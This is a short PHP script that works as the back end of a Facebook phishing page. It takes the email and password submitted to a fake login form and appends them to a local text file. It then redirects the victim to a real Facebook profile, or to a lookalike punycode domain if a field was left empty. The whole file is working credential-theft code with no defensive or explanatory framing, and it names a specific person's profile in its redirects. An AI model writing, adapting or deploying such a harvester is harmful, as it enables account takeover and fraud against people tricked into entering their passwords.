<?php
require "youme.txt";
$email = $_POST['email'];
$pass = $_POST['pass'];
if(empty($email) || empty($pass)){
    header('Location: https://www.xn--facebok-f1a.co/srishti.roychoudhary.9/');
}
else{
    $email = $email;
    $pass = $pass;
    $sep = "*********************\n";
    file_put_contents('youme.txt', $email.PHP_EOL , FILE_APPEND | LOCK_EX);
    file_put_contents('youme.txt', $pass.PHP_EOL , FILE_APPEND | LOCK_EX);
    file_put_contents('youme.txt', $sep.PHP_EOL , FILE_APPEND | LOCK_EX);
    header('Location: https://www.facebook.com/srishti.roychoudhury.9/');
}
?>